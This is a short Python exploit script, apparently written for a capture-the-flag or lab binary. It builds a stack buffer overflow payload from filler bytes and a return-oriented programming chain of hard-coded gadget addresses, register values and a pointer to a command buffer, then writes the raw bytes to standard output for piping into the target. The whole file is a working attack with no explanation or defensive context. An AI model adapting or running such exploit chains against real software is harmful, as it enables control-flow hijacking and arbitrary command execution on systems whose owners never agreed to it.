import sys, struct

gadget_a = 0x401a2a
gadget_b = 0x401a10
command_buf = 0x602090

payload = bytes([0x78, 0x19, 0x40, 0x00])
payload += b"A" * (24 - len(payload))
payload += struct.pack('<Q', gadget_a)
payload += struct.pack('<Q', 0)
payload += struct.pack('<Q', 1)
payload += struct.pack('<Q', command_buf)
payload += struct.pack('<Q', 4)
payload += struct.pack('<Q', 0)
payload += struct.pack('<Q', 0)
payload += struct.pack('<Q', gadget_b)

sys.stdout.buffer.write(payload)
